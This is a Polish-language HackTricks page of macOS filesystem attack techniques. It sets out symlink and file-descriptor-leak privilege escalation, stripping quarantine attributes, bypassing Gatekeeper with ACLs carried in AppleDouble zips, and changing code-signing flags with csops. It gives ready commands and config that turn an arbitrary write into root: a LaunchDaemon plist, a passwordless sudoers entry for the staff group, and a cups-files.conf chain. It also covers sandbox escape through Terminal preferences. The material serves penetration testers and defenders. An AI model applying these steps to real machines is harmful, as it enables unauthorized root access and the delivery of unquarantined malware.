# Sztuczki FS w macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacje uprawnień POSIX

Uprawnienia w **katalogu**:

- **read** - możesz **wyliczać** wpisy katalogu
- **write** - możesz **usuwać/zapisywać** **pliki** w katalogu oraz **usuwać puste foldery**.
- Nie możesz jednak **usuwać/modyfikować niepustych folderów**, chyba że masz do nich uprawnienia write.
- Nie możesz **modyfikować nazwy folderu**, chyba że jesteś jego właścicielem.
- **execute** - możesz **przechodzić przez** katalog - jeśli nie masz tego uprawnienia, nie możesz uzyskać dostępu do żadnych plików znajdujących się w nim ani w żadnych podkatalogach.

### Niebezpieczne kombinacje

**Jak nadpisać plik/folder należący do root**, gdy:

- Właścicielem jednego z **katalogów nadrzędnych** w ścieżce jest użytkownik
- Właścicielem jednego z **katalogów nadrzędnych** w ścieżce jest **grupa użytkowników** z dostępem **write**
- **Grupa użytkowników** ma dostęp **write** do **pliku**

Przy dowolnej z powyższych kombinacji attacker może **wstrzyknąć** **sym/hard link** w oczekiwanej ścieżce, aby uzyskać uprzywilejowany dowolny zapis.

### Szczególny przypadek folderu root R+X

Jeśli w **katalogu** znajdują się pliki, do których **wyłącznie root ma dostęp R+X**, nie są one dostępne dla nikogo innego. W związku z tym podatność pozwalająca **przenieść plik możliwy do odczytu przez użytkownika**, którego nie można odczytać z powodu tego **ograniczenia**, z tego folderu **do innego**, może zostać wykorzystana do odczytania tych plików.

Przykład: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

Jeśli uprzywilejowany proces zapisuje dane w **pliku**, który może być **kontrolowany** przez użytkownika o **niższych uprawnieniach** lub który mógł zostać **wcześniej utworzony** przez użytkownika o niższych uprawnieniach, użytkownik może po prostu **wskazać go na inny plik** za pomocą Symbolic lub Hard link, a uprzywilejowany proces zapisze dane w tym pliku.

Sprawdź pozostałe sekcje, w których attacker może **wykorzystać dowolny zapis do eskalacji uprawnień**.

### Open `O_NOFOLLOW`

Zgodnie z [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Sprawdzany jest tylko **końcowy** komponent — każdy **pośredni** komponent jest nadal rozwiązywany i śledzony. Dlatego developer, który „zabezpieczył” zapis za pomocą `O_NOFOLLOW`, nadal może zostać zaatakowany przez umieszczenie symlinku w dowolnym **katalogu nadrzędnym** docelowej ścieżki.

Ta sama strona man opisuje flagi, które faktycznie zamykają tę lukę:

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

W przeciwnym razie `openat()` względem deskryptora katalogu, który został już zweryfikowany, albo `realpath()` + ponowna walidacja to pozostałe sposoby na zatrzymanie podmian symlinków w środku ścieżki.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub binaria, więc po ich otwarciu zostanie wykonana wskazana aplikacja/binarium.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskryptory plików

### Leak FD (bez `O_CLOEXEC`)

Jeśli wywołanie `open` nie zawiera flagi `O_CLOEXEC`, deskryptor pliku zostanie odziedziczony przez proces potomny. Jeśli uprzywilejowany proces otworzy uprzywilejowany plik i wykona proces kontrolowany przez atakującego, atakujący **odziedziczy FD wskazujący na uprzywilejowany plik**.

Canonical example to **`DYLD_PRINT_TO_FILE` LPE w OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):

- `dyld` respektował `DYLD_PRINT_TO_FILE=/path` nawet w **restricted (suid root) binaries**, ponieważ ta konkretna zmienna była analizowana poza `processDyldEnvironmentVariable()`.
- Wykonywał `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, więc **tworzył plik należący do roota pod dowolną ścieżką**.
- FD **nigdy nie był zamykany i nie miał flagi close-on-exec**, więc każdy proces potomny suid binary dziedziczył **zapisywalny FD wskazujący na plik należący do roota**.
- Uruchomienie np. `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a następnie odczytanie numeru odziedziczonego FD w procesie potomnym umożliwiało wykonywanie dowolnych zapisów do pliku należącego do roota; `fcntl(fd, F_SETFL, 0)` usuwało nawet `O_APPEND`, umożliwiając nadpisywanie zamiast dopisywania.

Ten sam schemat występuje zawsze, gdy uprzywilejowany proces otwiera plik **przed** wykonaniem czegoś, co kontrolujesz (helper tools, edytory w stylu `crontab` uruchamiane przez `$EDITOR`, pliki logów/debug otwierane ze ścieżki pochodzącej ze zmiennej środowiskowej...). Wylicz odziedziczone FD za pomocą:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Wszystko powyżej `2`, co wskazuje na plik, którego nie możesz samodzielnie otworzyć, jest prymitywem arbitrary-write (lub arbitrary-read).

## Unikaj trików z quarantine xattrs

### Usuń to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Flaga uchg / uchange / uimmutable

Jeśli plik/folder ma ten atrybut immutable, nie będzie możliwe umieszczenie na nim xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Systemy plików bez obsługi xattr

Nie każdy system plików, który macOS może zamontować, natywnie przechowuje **extended attributes**. HFS+ i APFS je obsługują; **FAT32, exFAT i większość montowań NFS nie** — macOS emuluje je, zapisując dodatkowy plik **AppleDouble** o nazwie `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Ma to znaczenie w przypadku quarantine, ponieważ xattr przetrwa tylko wtedy, gdy można go faktycznie zapisać **i odczytać z powrotem** z tego samego woluminu:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Jeśli wolumin zostanie później odczytany za pośrednictwem ścieżki, która ignoruje towarzyszący plik `._` (lub ten plik zostanie usunięty), plik zostanie dostarczony **bez flagi kwarantanny** — a nieobjęty kwarantanną plik `.app` wystarczy, aby uciec z App Sandbox, jak opisano w artykule [Debugowanie i obchodzenie macOS Sandbox](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ta ACL uniemożliwia dodawanie `xattrs` do pliku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format plików **AppleDouble** kopiuje plik wraz z jego ACE.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana wewnątrz xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w zdekompresowanym pliku. Jeśli więc skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, które uniemożliwia zapis innych xattr... xattr quarantine nie zostanie ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/), aby uzyskać więcej informacji.

Aby to odtworzyć, najpierw musimy uzyskać poprawny ciąg ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Zauważ, że nawet jeśli to zadziała, sandbox wcześniej zapisze xattr quarantine)

Nie jest to naprawdę potrzebne, ale zostawiam to tutaj na wszelki wypadek:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Ominięcie kontroli sygnatur

### Ominięcie kontroli plików binarnych platformy

Niektóre kontrole bezpieczeństwa sprawdzają, czy plik binarny jest **platform binary**, na przykład aby zezwolić na połączenie z usługą XPC. Jednak, jak pokazano w https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, można ominąć tę kontrolę, pobierając plik binarny platformy (taki jak /bin/ls) i wstrzykując exploit za pomocą dyld przez zmienną środowiskową `DYLD_INSERT_LIBRARIES`.

### Ominięcie flag `CS_REQUIRE_LV` i `CS_FORCED_LV`

Wykonujący się plik binarny może zmodyfikować własne flagi, aby ominąć kontrole, za pomocą kodu takiego jak:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Obejście sygnatur kodu

Bundles zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego pojedynczego **file** w **bundle**. Należy pamiętać, że hash pliku CodeResources jest również **embedded** w pliku wykonywalnym, więc tego także nie możemy modyfikować.

Istnieją jednak pliki, których sygnatura nie zostanie sprawdzona. Mają one klucz omit w pliku plist, na przykład:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Możliwe jest obliczenie sygnatury zasobu z poziomu CLI za pomocą:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montowanie dmg

Użytkownik może zamontować utworzony niestandardowy dmg nawet na niektórych istniejących folderach. W ten sposób można utworzyć niestandardowy pakiet dmg z własną zawartością:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Zwykle macOS montuje dyski, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (udostępnianą przez `/usr/libexec/diskarbitrationd`). Po dodaniu parametru `-d` do pliku plist LaunchDaemons i ponownym uruchomieniu będzie zapisywać logi w `/var/log/diskarbitrationd.log`.\
Możliwe jest jednak użycie narzędzi takich jak `hdik` i `hdiutil` do bezpośredniej komunikacji z kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Jeśli Twój skrypt może być interpretowany jako **shell script**, możesz nadpisać **`/etc/periodic/daily/999.local`** shell script, który będzie uruchamiany codziennie.

Możesz **zasymulować wykonanie** tego skryptu za pomocą: **`sudo periodic daily`**

### Daemons

Utwórz dowolny **LaunchDaemon**, na przykład **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, zawierający plist wykonujący dowolny skrypt, na przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Wygeneruj skrypt `/Applications/Scripts/privesc.sh` zawierający **commands**, które chcesz uruchomić jako root.

### Plik Sudoers

Jeśli masz **arbitrary write**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`**, przyznający Ci uprawnienia **sudo**.

### Pliki PATH

Plik **`/etc/paths`** jest jednym z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Do jego nadpisania musisz mieć uprawnienia root, ale jeśli skrypt uruchamiany przez **uprzywilejowany proces** wykonuje jakieś **command bez pełnej ścieżki**, możesz być w stanie je **hijack**, modyfikując ten plik.

Możesz również zapisywać pliki w **`/etc/paths.d`**, aby załadować nowe foldery do zmiennej środowiskowej `PATH`.

### cups-files.conf

Ta technika została użyta w [tym writeupie](https://www.kandji.io/blog/macos-audit-story-part1).

Utwórz plik `/etc/cups/cups-files.conf` z następującą zawartością:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Spowoduje to utworzenie pliku `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowy tekst na końcu służy do wywołania utworzenia error logu.

Następnie zapisz w `/etc/sudoers.d/lpe` wymaganą konfigurację do eskalacji uprawnień, np. `%staff ALL=(ALL) NOPASSWD:ALL`.

Następnie ponownie zmodyfikuj plik `/etc/cups/cups-files.conf`, wskazując `LogFilePerm 700`, aby nowy plik sudoers stał się prawidłowy po wywołaniu `cupsctl`.

### Ucieczka z Sandbox

Możliwe jest opuszczenie macOS sandbox za pomocą arbitrary write w systemie plików. Przykłady znajdziesz na stronie [macOS Auto Start](../../../../macos-auto-start-locations.md), ale często stosowaną metodą jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który wykonuje polecenie podczas uruchamiania, a następnie wywołanie go za pomocą `open`.

## Generowanie zapisywalnych plików jako inni użytkownicy

Bardzo często spotykanym privesc primitive jest nakłonienie **uprzywilejowanego procesu do utworzenia pliku** w kontrolowanym przez Ciebie katalogu, a następnie zachowanie **dostępu do zapisu** do tego pliku. Potrzebne są dwa elementy:

1. Katalog, którego jesteś właścicielem (lub w którym możesz ustawić **inheritable ACL**), aby wszystko utworzone w jego obrębie dziedziczyło Twoje uprawnienia.
2. Uprzywilejowany proces/`suid`, któremu można wskazać **miejsce** utworzenia pliku — zazwyczaj za pomocą zmiennej środowiskowej debugowania/logowania, pliku konfiguracyjnego lub API XPC helpera.

Element **inheritable ACL** sprawia, że utworzony plik jest zapisywalny przez Ciebie, mimo że jego właścicielem jest inny użytkownik. Flagi dziedziczenia `file_inherit` / `directory_inherit` są opisane w [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Teraz każdy plik, który uprzywilejowany proces utworzy wewnątrz `$DIRNAME`, jest **zapisywalny przez ciebie**. Jeśli ten katalog jest również lokalizacją, z której później wykonywany jest kod jako **root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, katalog LaunchDaemon...), prowadzi to bezpośrednio do eskalacji uprawnień do root. Zobacz sekcje [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) powyżej, aby dowiedzieć się, co zapisać po uzyskaniu pliku.

Pełny przykład łańcucha „zmienna środowiskowa powoduje, że proces root tworzy plik, a FD leakuje do ciebie” znajdziesz powyżej w sekcji [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## POSIX Shared Memory

**POSIX shared memory** umożliwia procesom w systemach operacyjnych zgodnych z POSIX dostęp do wspólnego obszaru pamięci, zapewniając szybszą komunikację w porównaniu z innymi metodami komunikacji międzyprocesowej. Polega na utworzeniu lub otwarciu obiektu shared memory za pomocą `shm_open()`, ustawieniu jego rozmiaru za pomocą `ftruncate()` oraz zmapowaniu go w przestrzeni adresowej procesu przy użyciu `mmap()`. Procesy mogą następnie bezpośrednio odczytywać dane z tego obszaru pamięci i zapisywać je w nim. Aby zarządzać współbieżnym dostępem i zapobiegać uszkodzeniu danych, często używa się mechanizmów synchronizacji, takich jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają shared memory za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci przy użyciu `shm_unlink()`. System ten jest szczególnie skuteczny w zapewnianiu wydajnej i szybkiej komunikacji IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.

<details>

<summary>Przykład kodu producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Przykład kodu konsumenta</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded Descriptors** to funkcja bezpieczeństwa wprowadzona w systemie macOS w celu zwiększenia bezpieczeństwa i niezawodności **operacji na deskryptorach plików** w aplikacjach użytkownika. Te chronione deskryptory umożliwiają powiązanie określonych ograniczeń lub „guardów” z deskryptorami plików, które są egzekwowane przez kernel.

Funkcja ta jest szczególnie przydatna w zapobieganiu określonym klasom luk w zabezpieczeniach, takim jak **nieautoryzowany dostęp do plików** lub **race conditions**. Luki te występują na przykład wtedy, gdy jeden wątek uzyskuje dostęp do opisu pliku, zapewniając **innemu podatnemu wątkowi dostęp do niego**, lub gdy deskryptor pliku zostaje **odziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

- `guarded_open_np`: Otwiera FD z guardem
- `guarded_close_np`: Zamyka go
- `change_fdguard_np`: Zmienia flagi guarda deskryptora (może nawet usunąć ochronę guarda)

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (wycieknięty FD bez close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (flagi dziedziczenia ACL)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
